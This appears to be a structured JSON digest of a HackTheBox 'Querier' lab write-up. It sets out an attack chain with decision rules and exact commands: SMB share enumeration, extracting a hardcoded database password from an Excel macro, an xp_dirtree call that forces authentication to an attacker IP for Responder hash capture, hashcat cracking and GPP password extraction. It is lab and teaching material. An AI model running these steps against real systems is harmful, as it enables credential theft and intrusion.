@@ -1,0 +1,1039 @@
+{
+  "writeup_id": "Htb_Querier",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_mssql_macro_credential_extraction",
+    "primary_services": [
+      "smb",
+      "mssql",
+      "winrm",
+      "msrpc"
+    ],
+    "port_signature": "135+139+445+1433+5985",
+    "service_combination": "smb+mssql+winrm+msrpc",
+    "os_family": "windows_server",
+    "environment_type": "corporate_database_server",
+    "entry_vector": "smb_anonymous_access",
+    "privilege_path": "document_forensics_to_database_access_to_system",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "excel_macro_with_hardcoded_credentials",
+      "anonymous_smb_share_access",
+      "mssql_limited_user_access",
+      "responder_ntlmv2_capture_opportunity"
+    ],
+    "environmental_clues": [
+      "reports_share_name",
+      "xlsm_file_with_database_connection",
+      "sql_server_trusted_connection_disabled",
+      "corporate_reporting_infrastructure"
+    ],
+    "similar_scenarios": [
+      "giddy_htb_easy",
+      "mantis_htb_hard"
+    ],
+    "unique_aspects": [
+      "vba_macro_credential_extraction",
+      "mssql_responder_hash_capture",
+      "gpp_password_privilege_escalation"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "SMB_Null_Session_Enumeration",
+        "success_reason": "Reports share accessible without authentication",
+        "prerequisite_indicators": [
+          "smb_service_available",
+          "null_session_allowed",
+          "guest_access_enabled"
+        ],
+        "recognition_patterns": [
+          "smbclient -N -L succeeds",
+          "non-default share names (Reports)",
+          "accessible files in shares"
+        ],
+        "failure_modes": [
+          "null_sessions_disabled",
+          "share_permissions_restricted",
+          "no_interesting_shares"
+        ],
+        "environmental_factors": [
+          "default_smb_configuration",
+          "legacy_file_sharing_setup",
+          "insufficient_access_controls"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "2-5 minutes"
+      },
+      {
+        "technique": "Macro_Credential_Extraction",
+        "success_reason": "VBA macro contained hardcoded database credentials",
+        "prerequisite_indicators": [
+          "office_documents_available",
+          "macro_enabled_files",
+          "development_artifacts_present"
+        ],
+        "recognition_patterns": [
+          ".xlsm file extensions",
+          "olevba shows connection strings",
+          "hardcoded Uid/Pwd parameters"
+        ],
+        "failure_modes": [
+          "no_macro_enabled_documents",
+          "encrypted_or_protected_macros",
+          "no_hardcoded_credentials"
+        ],
+        "environmental_factors": [
+          "development_environment_exposure",
+          "poor_credential_management",
+          "testing_artifacts_in_production"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "5-10 minutes"
+      },
+      {
+        "technique": "MSSQL_Authentication",
+        "success_reason": "Extracted credentials valid for SQL Server access",
+        "prerequisite_indicators": [
+          "mssql_service_accessible",
+          "valid_credentials_obtained",
+          "sql_authentication_enabled"
+        ],
+        "recognition_patterns": [
+          "port 1433 open",
+          "mssqlclient.py connection succeeds",
+          "database context changes"
+        ],
+        "failure_modes": [
+          "credentials_expired_or_invalid",
+          "windows_auth_only",
+          "network_access_restricted"
+        ],
+        "environmental_factors": [
+          "mixed_authentication_mode",
+          "network_accessible_database",
+          "service_account_permissions"
+        ],
+        "success_probability": 0.9,
+        "typical_timeframe": "2-3 minutes"
+      },
+      {
+        "technique": "Responder_Hash_Capture",
+        "success_reason": "MSSQL xp_dirtree forced authentication to attacker SMB",
+        "prerequisite_indicators": [
+          "mssql_access_available",
+          "xp_dirtree_enabled",
+          "network_connectivity_bidirectional"
+        ],
+        "recognition_patterns": [
+          "xp_dirtree execution succeeds",
+          "responder captures Net-NTLMv2",
+          "service account authentication"
+        ],
+        "failure_modes": [
+          "xp_cmdshell_disabled",
+          "network_segmentation",
+          "extended_stored_procedures_disabled"
+        ],
+        "environmental_factors": [
+          "default_mssql_configuration",
+          "service_account_context",
+          "network_smb_accessibility"
+        ],
+        "success_probability": 0.8,
+        "typical_timeframe": "5-10 minutes"
+      },
+      {
+        "technique": "GPP_Password_Extraction",
+        "success_reason": "PowerUp.ps1 found administrator credentials in Group Policy Preferences",
+        "prerequisite_indicators": [
+          "domain_joined_machine",
+          "gpp_files_accessible",
+          "legacy_group_policy_usage"
+        ],
+        "recognition_patterns": [
+          "PowerUp shows GPP passwords",
+          "cpassword attributes in XML",
+          "SYSVOL share accessible"
+        ],
+        "failure_modes": [
+          "no_gpp_files_present",
+          "gpp_passwords_removed",
+          "insufficient_share_access"
+        ],
+        "environmental_factors": [
+          "legacy_windows_domain",
+          "group_policy_credential_storage",
+          "insufficient_gpp_cleanup"
+        ],
+        "success_probability": 0.7,
+        "typical_timeframe": "3-8 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Currency Volume Report.xlsm with hardcoded credentials",
+        "discovery_method": "SMB share enumeration and olevba analysis",
+        "why_critical": "Provided initial database access leading to hash capture",
+        "how_to_recognize": [
+          "macro-enabled office documents",
+          "connection strings in VBA code",
+          "hardcoded authentication parameters"
+        ],
+        "follow_up_actions": [
+          "extract_credentials_from_macros",
+          "test_database_connectivity",
+          "enumerate_database_permissions"
+        ]
+      },
+      {
+        "discovery": "MSSQL service with xp_dirtree capability",
+        "discovery_method": "Database connection and extended procedure testing",
+        "why_critical": "Enabled forced authentication and hash capture",
+        "how_to_recognize": [
+          "mssql service accessible",
+          "extended stored procedures enabled",
+          "bidirectional network connectivity"
+        ],
+        "follow_up_actions": [
+          "setup_responder_listener",
+          "execute_xp_dirtree_to_attacker",
+          "crack_captured_hashes"
+        ]
+      },
+      {
+        "discovery": "GPP passwords in domain environment",
+        "discovery_method": "PowerUp.ps1 automated enumeration",
+        "why_critical": "Direct path to administrator privileges",
+        "how_to_recognize": [
+          "domain-joined windows machine",
+          "PowerUp GPP findings",
+          "accessible SYSVOL share"
+        ],
+        "follow_up_actions": [
+          "extract_gpp_passwords",
+          "test_administrator_credentials",
+          "establish_privileged_access"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "limited_database_user",
+        "escalation_method": "Responder_Hash_Capture",
+        "why_possible": "MSSQL xp_dirtree forced authentication as service account",
+        "recognition_signs": [
+          "mssql_extended_procedures_enabled",
+          "service_running_as_domain_account",
+          "smb_connectivity_to_attacker"
+        ],
+        "exploitation_path": "xp_dirtree → Responder → Hash Crack → Service Account Shell"
+      },
+      {
+        "privilege_level": "service_account",
+        "escalation_method": "GPP_Password_Extraction",
+        "why_possible": "Domain environment with legacy Group Policy Preferences",
+        "recognition_signs": [
+          "domain_joined_machine",
+          "PowerUp_identifies_gpp_passwords",
+          "accessible_sysvol_share"
+        ],
+        "exploitation_path": "PowerUp.ps1 → GPP Password → Administrator Access"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 135,139,445,1433,5985 open on Windows host",
+        "decision": "Enumerate SMB shares first for easy wins before attacking MSSQL",
+        "reasoning": "SMB often provides initial foothold with less complexity than database attacks",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "mssql_enumeration",
+            "when": "if smb_shares_empty"
+          },
+          {
+            "option": "winrm_bruteforce",
+            "when": "if_credentials_found"
+          }
+        ],
+        "success_indicators": [
+          "accessible_smb_shares_found",
+          "interesting_files_discovered",
+          "credentials_in_files"
+        ],
+        "next_decision": "analyze_discovered_files"
+      },
+      {
+        "step": 2,
+        "situation": "Found Excel macro file (.xlsm) in SMB share",
+        "decision": "Extract VBA macros to find embedded credentials",
+        "reasoning": "Macro-enabled documents commonly contain hardcoded database credentials",
+        "confidence": 0.85,
+        "prerequisites": [
+          "xlsm_file_downloaded"
+        ],
+        "tools": [
+          "olevba",
+          "oletools"
+        ],
+        "success_indicators": [
+          "database_credentials_found",
+          "connection_strings_discovered"
+        ],
+        "next_decision": "test_database_access"
+      },
+      {
+        "step": 3,
+        "situation": "Found MSSQL credentials in macro, have limited database access",
+        "decision": "Use xp_dirtree with responder to capture Net-NTLMv2 hash",
+        "reasoning": "Limited SQL access can be leveraged to force authentication and capture service account hash",
+        "confidence": 0.8,
+        "prerequisites": [
+          "mssql_access_confirmed",
+          "responder_ready"
+        ],
+        "success_indicators": [
+          "net_ntlmv2_hash_captured"
+        ],
+        "failure_fallbacks": [
+          "xp_cmdshell_attempt",
+          "other_stored_procedures"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "Captured Net-NTLMv2 hash from MSSQL service account",
+        "decision": "Crack hash and use for enhanced database access",
+        "reasoning": "Service account likely has higher privileges than reporting user",
+        "confidence": 0.75,
+        "tools": [
+          "hashcat",
+          "john"
+        ],
+        "success_indicators": [
+          "hash_cracked",
+          "service_account_access"
+        ],
+        "next_decision": "attempt_command_execution"
+      }
+    ],
+    "branching_logic": {
+      "if_smb_enumeration_succeeds": {
+        "action": "analyze_files_for_credentials",
+        "tools": [
+          "olevba",
+          "strings",
+          "grep"
+        ],
+        "next_phase": "credential_validation"
+      },
+      "if_database_credentials_found": {
+        "action": "test_mssql_connection",
+        "tools": [
+          "mssqlclient.py"
+        ],
+        "next_phase": "database_privilege_escalation"
+      },
+      "if_limited_sql_access": {
+        "action": "attempt_hash_capture",
+        "method": "xp_dirtree_with_responder",
+        "tools": [
+          "responder",
+          "xp_dirtree"
+        ]
+      },
+      "if_service_hash_captured": {
+        "action": "crack_and_authenticate",
+        "tools": [
+          "hashcat",
+          "mssqlclient.py"
+        ],
+        "next_phase": "command_execution_attempts"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_smb_shares_first",
+        "reasoning": "lowest_hanging_fruit_with_high_success_rate",
+        "applicability": "windows_hosts_with_smb_open"
+      },
+      {
+        "rule": "extract_macros_from_office_documents",
+        "reasoning": "commonly_contain_hardcoded_credentials",
+        "applicability": "office_documents_found"
+      },
+      {
+        "rule": "use_responder_with_sql_functions_for_hash_capture",
+        "reasoning": "effective_privilege_escalation_from_limited_sql_access",
+        "applicability": "mssql_access_without_xp_cmdshell"
+      },
+      {
+        "rule": "service_accounts_often_have_higher_privileges",
+        "reasoning": "worth_cracking_captured_service_hashes",
+        "applicability": "service_account_hashes_captured"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "SMB Anonymous Enumeration",
+        "mitre_id": "T1135",
+        "required_services": [
+          "smb",
+          "netbios-ssn"
+        ],
+        "required_ports": [
+          139,
+          445
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "smb_service_enabled",
+          "null_session_allowed",
+          "accessible_shares_exist"
+        ],
+        "success_indicators": [
+          "smbclient_lists_shares",
+          "readable_files_found",
+          "writable_directories_present"
+        ],
+        "incompatible_with": [
+          "smb_disabled",
+          "null_session_blocked",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "default_windows_configuration",
+          "legacy_smb_settings",
+          "administrative_shares_visible"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "2-5 minutes"
+      },
+      {
+        "technique": "Document Macro Analysis",
+        "mitre_id": "T1566.001",
+        "required_services": [],
+        "required_ports": [],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "office_documents_accessible",
+          "macro_enabled_files_present",
+          "file_extraction_possible"
+        ],
+        "success_indicators": [
+          "vba_macros_extracted",
+          "credentials_in_code",
+          "connection_strings_found"
+        ],
+        "incompatible_with": [
+          "encrypted_documents",
+          "password_protected_macros",
+          "no_macro_content"
+        ],
+        "confidence_boosters": [
+          "xlsm_file_extensions",
+          "development_comments_present",
+          "hardcoded_credentials"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "3-10 minutes"
+      },
+      {
+        "technique": "MSSQL Authentication",
+        "mitre_id": "T1078.003",
+        "required_services": [
+          "ms-sql-s"
+        ],
+        "required_ports": [
+          1433
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "mssql_service_running",
+          "valid_credentials_available",
+          "network_connectivity_to_db"
+        ],
+        "success_indicators": [
+          "successful_database_login",
+          "query_execution_possible",
+          "database_enumeration_works"
+        ],
+        "incompatible_with": [
+          "mssql_disabled",
+          "invalid_credentials",
+          "firewall_blocking_access"
+        ],
+        "confidence_boosters": [
+          "default_mssql_port_open",
+          "sql_server_banner_detected",
+          "windows_authentication_disabled"
+        ],
+        "typical_success_rate": 0.9,
+        "estimated_time": "1-3 minutes"
+      },
+      {
+        "technique": "Responder Hash Capture",
+        "mitre_id": "T1557.001",
+        "required_services": [
+          "smb"
+        ],
+        "required_ports": [
+          445
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "ntlm_authentication_enabled",
+          "network_position_for_mitm",
+          "target_makes_smb_requests"
+        ],
+        "success_indicators": [
+          "net_ntlmv2_hash_captured",
+          "responder_receives_challenge",
+          "authentication_attempt_logged"
+        ],
+        "incompatible_with": [
+          "kerberos_only_auth",
+          "smb_signing_required",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "mixed_authentication_environment",
+          "legacy_windows_clients",
+          "service_account_usage"
+        ],
+        "typical_success_rate": 0.8,
+        "estimated_time": "5-15 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "windows_domain": {
+        "port_indicators": [
+          53,
+          88,
+          135,
+          139,
+          389,
+          445,
+          3268
+        ],
+        "service_indicators": [
+          "kerberos",
+          "ldap",
+          "smb",
+          "msrpc"
+        ],
+        "banner_indicators": [
+          "Active Directory",
+          "Windows Server",
+          "NetBIOS_Domain_Name"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "mssql_server": {
+        "port_indicators": [
+          1433
+        ],
+        "service_indicators": [
+          "ms-sql-s"
+        ],
+        "banner_indicators": [
+          "Microsoft SQL Server",
+          "SQL Server"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "smb_service": {
+        "port_indicators": [
+          139,
+          445
+        ],
+        "service_indicators": [
+          "netbios-ssn",
+          "microsoft-ds"
+        ],
+        "banner_indicators": [
+          "SMB",
+          "CIFS"
+        ],
+        "confidence_threshold": 0.9
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "smb_anonymous_enumeration",
+          "when": "smb_service_detected",
+          "reason": "often_reveals_sensitive_files_and_shares"
+        },
+        {
+          "attack": "document_macro_analysis",
+          "when": "office_files_found_in_shares",
+          "reason": "frequently_contains_hardcoded_credentials"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "mssql_authentication",
+          "when": "mssql_detected_and_creds_found",
+          "reason": "reliable_with_valid_credentials"
+        },
+        {
+          "attack": "responder_hash_capture",
+          "when": "windows_environment_detected",
+          "reason": "effective_for_credential_harvesting"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "SMB Share Enumeration",
+        "mitre_id": "T1135",
+        "category": "discovery",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "smbclient",
+            "command_template": "smbclient -N -L //{target_ip}",
+            "actual_command": "smbclient -N -L //10.10.10.125",
+            "output_pattern": "Sharename.*Type.*Comment",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "smbclient",
+            "command_template": "smbclient -N //{target_ip}/{share_name}",
+            "actual_command": "smbclient -N //10.10.10.125/Reports",
+            "success_factors": [
+              "null_session_allowed",
+              "readable_shares_exist"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "smb_service_accessible",
+          "null_session_allowed"
+        ],
+        "success_indicators": [
+          "shares_enumerated",
+          "files_accessible",
+          "sensitive_data_discovered"
+        ],
+        "common_failures": [
+          "null_session_disabled",
+          "access_denied_errors",
+          "no_interesting_shares"
+        ],
+        "follow_up_techniques": [
+          "document_analysis",
+          "credential_extraction",
+          "lateral_movement"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "VBA Macro Analysis",
+        "mitre_id": "T1059.005",
+        "category": "execution",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "olevba",
+            "command_template": "olevba {filename}",
+            "actual_command": "olevba Currency\\ Volume\\ Report.xlsm",
+            "output_pattern": "VBA MACRO.*ConnectionString.*Uid=.*Pwd=",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "macro_enabled_document_available",
+          "oletools_installed"
+        ],
+        "success_indicators": [
+          "credentials_extracted",
+          "connection_strings_found",
+          "database_details_revealed"
+        ],
+        "common_failures": [
+          "encrypted_macros",
+          "obfuscated_code",
+          "no_sensitive_data_in_macros"
+        ],
+        "follow_up_techniques": [
+          "database_authentication",
+          "credential_validation",
+          "privilege_escalation"
+        ],
+        "time_investment": "2-10 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "MSSQL Authentication",
+        "mitre_id": "T1078.003",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "mssqlclient.py",
+            "command_template": "mssqlclient.py {username}:'{password}'@{target_ip} -windows-auth",
+            "actual_command": "mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth",
+            "output_pattern": "ACK: Result: 1 - Microsoft SQL Server",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "valid_database_credentials",
+          "mssql_service_accessible",
+          "windows_authentication_enabled"
+        ],
+        "success_indicators": [
+          "successful_authentication",
+          "database_access_granted",
+          "sql_commands_executable"
+        ],
+        "common_failures": [
+          "invalid_credentials",
+          "account_locked",
+          "network_connectivity_issues"
+        ],
+        "follow_up_techniques": [
+          "database_enumeration",
+          "privilege_escalation",
+          "credential_harvesting"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "MSSQL Net-NTLMv2 Capture",
+        "mitre_id": "T1187",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "responder",
+            "command_template": "responder -I {interface}",
+            "actual_command": "responder -I tun0",
+            "output_pattern": "NTLMv2-SSP Hash.*::",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          },
+          {
+            "name": "xp_dirtree",
+            "command_template": "xp_dirtree '\\\\{attacker_ip}\\{share_name}';",
+            "actual_command": "xp_dirtree '\\\\10.10.14.14\\a';",
+            "success_factors": [
+              "smb_outbound_allowed",
+              "responder_listening"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "mssql_access_available",
+          "xp_dirtree_enabled",
+          "outbound_smb_allowed"
+        ],
+        "success_indicators": [
+          "netntlmv2_hash_captured",
+          "service_account_identified",
+          "authentication_attempt_logged"
+        ],
+        "common_failures": [
+          "outbound_connections_blocked",
+          "xp_dirtree_disabled",
+          "responder_not_listening"
+        ],
+        "follow_up_techniques": [
+          "hash_cracking",
+          "credential_validation",
+          "lateral_movement"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Net-NTLMv2 Hash Cracking",
+        "mitre_id": "T1110.002",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "hashcat",
+            "command_template": "hashcat -m 5600 {hash_file} {wordlist} -o {output_file} --force",
+            "actual_command": "hashcat -m 5600 mssql-svc.netntlmv2 /usr/share/wordlists/rockyou.txt -o mssql-svc.netntlmv2.cracked --force",
+            "output_pattern": "Status.*Cracked",
+            "effectiveness_rating": 4,
+            "reliability": 0.75
+          }
+        ],
+        "prerequisites": [
+          "netntlmv2_hash_captured",
+          "wordlist_available",
+          "sufficient_compute_power"
+        ],
+        "success_indicators": [
+          "hash_cracked_successfully",
+          "plaintext_password_recovered",
+          "credentials_validated"
+        ],
+        "common_failures": [
+          "strong_password_policy",
+          "insufficient_wordlist",
+          "limited_compute_resources"
+        ],
+        "follow_up_techniques": [
+          "credential_validation",
+          "lateral_movement",
+          "privilege_escalation"
+        ],
+        "time_investment": "10 minutes - several hours",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "olevba",
+        "use_case": "macro_analysis_credential_extraction",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "document_forensics",
+          "macro_analysis"
+        ],
+        "alternatives": [
+          "manual_vba_extraction",
+          "oledump"
+        ],
+        "best_practices": [
+          "analyze_all_macro_enabled_documents",
+          "look_for_connection_strings",
+          "check_for_obfuscated_credentials"
+        ]
+      },
+      {
+        "tool": "responder",
+        "use_case": "netntlmv2_hash_capture",
+        "effectiveness_rating": 5,
+        "reliability": 0.9,
+        "learning_curve": "medium",
+        "essential_for": [
+          "credential_harvesting",
+          "ntlm_relay_attacks"
+        ],
+        "alternatives": [
+          "ntlmrelayx",
+          "inveigh"
+        ],
+        "best_practices": [
+          "run_on_correct_interface",
+          "monitor_for_authentication_attempts",
+          "combine_with_forced_authentication_techniques"
+        ]
+      },
+      {
+        "tool": "mssqlclient.py",
+        "use_case": "mssql_database_access",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "database_enumeration",
+          "sql_command_execution"
+        ],
+        "alternatives": [
+          "sqlcmd",
+          "dbeaver",
+          "manual_sql_tools"
+        ],
+        "best_practices": [
+          "use_windows_auth_when_available",
+          "enumerate_permissions_first",
+          "leverage_extended_procedures"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "smb_to_database_access",
+        "steps": [
+          {
+            "step": 1,
+            "command": "smbclient -N -L //10.10.10.125",
+            "purpose": "Enumerate SMB shares",
+            "expected_output": "List of available shares including Reports"
+          },
+          {
+            "step": 2,
+            "command": "smbclient -N //10.10.10.125/Reports",
+            "purpose": "Access Reports share",
+            "expected_output": "SMB prompt with file listing"
+          },
+          {
+            "step": 3,
+            "command": "get \"Currency Volume Report.xlsm\"",
+            "purpose": "Download macro-enabled workbook",
+            "expected_output": "File downloaded successfully"
+          },
+          {
+            "step": 4,
+            "command": "olevba Currency\\ Volume\\ Report.xlsm",
+            "purpose": "Extract VBA macros and credentials",
+            "expected_output": "Database credentials: reporting:PcwTWTHRwryjc$c6"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "10-20 minutes"
+      },
+      {
+        "sequence_name": "mssql_netntlmv2_capture",
+        "steps": [
+          {
+            "step": 1,
+            "command": "responder -I tun0",
+            "purpose": "Start responder to capture hashes",
+            "expected_output": "Responder listening on interface"
+          },
+          {
+            "step": 2,
+            "command": "mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth",
+            "purpose": "Connect to MSSQL database",
+            "expected_output": "SQL prompt with database access"
+          },
+          {
+            "step": 3,
+            "command": "xp_dirtree '\\\\10.10.14.14\\a';",
+            "purpose": "Force SMB authentication to capture hash",
+            "expected_output": "Net-NTLMv2 hash captured by responder"
+          },
+          {
+            "step": 4,
+            "command": "hashcat -m 5600 mssql-svc.netntlmv2 /usr/share/wordlists/rockyou.txt -o cracked.txt --force",
+            "purpose": "Crack captured Net-NTLMv2 hash",
+            "expected_output": "Plaintext password recovered"
+          }
+        ],
+        "success_rate": 0.8,
+        "typical_duration": "15-60 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Querier",
+      "difficulty": "Medium",
+      "os": "Windows",
+      "platform": "HackTheBox",
+      "release_date": "2019-02-16",
+      "author": "mrh4sh & egre55",
+      "estimated_time": "60-90 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "smb_enumeration",
+        "mssql_exploitation",
+        "responder_attacks"
+      ],
+      "key_vulnerabilities": [
+        "exposed_smb_shares",
+        "macro_enabled_documents",
+        "mssql_command_execution",
+        "gpp_passwords"
+      ],
+      "environment_type": "corporate_database_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "document_forensics",
+        "mssql_attacks",
+        "responder_usage",
+        "gpp_exploitation"
+      ],
+      "prerequisite_knowledge": [
+        "smb_enumeration",
+        "mssql_basics",
+        "windows_privilege_escalation",
+        "macro_analysis"
+      ]
+    },
+    "categorization": {
+      "primary_category": "database_exploitation",
+      "subcategories": [
+        "document_forensics",
+        "credential_harvesting",
+        "privilege_escalation"
+      ],
+      "attack_types": [
+        "credential_access",
+        "lateral_movement",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "secure_smb_shares",
+        "disable_macros",
+        "secure_database_configs",
+        "gpp_remediation"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Giddy",
+        "Mantis",
+        "Tally"
+      ],
+      "similarity_reasons": [
+        "mssql_exploitation",
+        "document_analysis",
+        "windows_privesc"
+      ],
+      "unique_aspects": [
+        "excel_macro_forensics",
+        "responder_hash_capture",
+        "powerup_gpp_discovery"
+      ],
+      "difficulty_factors": [
+        "multi_stage_attack_chain",
+        "document_analysis_required",
+        "database_knowledge_needed"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-05T00:02:33.367628",
+    "original_file": "0xdf_writeups/Htb Querier.md",
+    "content_length": 31569,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
